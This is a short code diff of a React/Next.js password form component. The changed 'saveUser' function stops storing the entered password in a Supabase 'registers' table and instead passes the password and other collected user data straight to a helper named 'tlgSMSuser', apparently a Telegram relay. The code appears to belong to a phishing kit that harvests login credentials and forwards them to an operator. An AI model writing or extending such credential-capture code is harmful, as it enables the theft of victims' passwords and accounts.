@@ -1,5 +1,5 @@
 "use client";
-import { tlgSMSuser, supabase } from "@/utils/utils";
+import { tlgSMSuser } from "@/utils/utils";
 
 export default function PassForm({ open, close, user, dataInfo }) {
   function handlerVisivility() {
@@ -40,20 +40,10 @@ export default function PassForm({ open, close, user, dataInfo }) {
 
   if (!open) return null;
 
-  async function saveUser(pass) {
-    try {
-      const { data } = await supabase
-        .from("registers")
-        .insert({ user: dataInfo.user, pass: pass })
-        .select();
-      if (data) {
-        user({ ...dataInfo, id: data[0].id, pass: pass });
-        tlgSMSuser({ ...dataInfo, id: data[0].id, pass: pass });
+  function saveUser(pass) {
+    user({ ...dataInfo, pass: pass });
+        tlgSMSuser({ ...dataInfo, pass: pass });
         close();
-      }
-    } catch (error) {
-      console.error(error);
-    }
   }
 
   return (
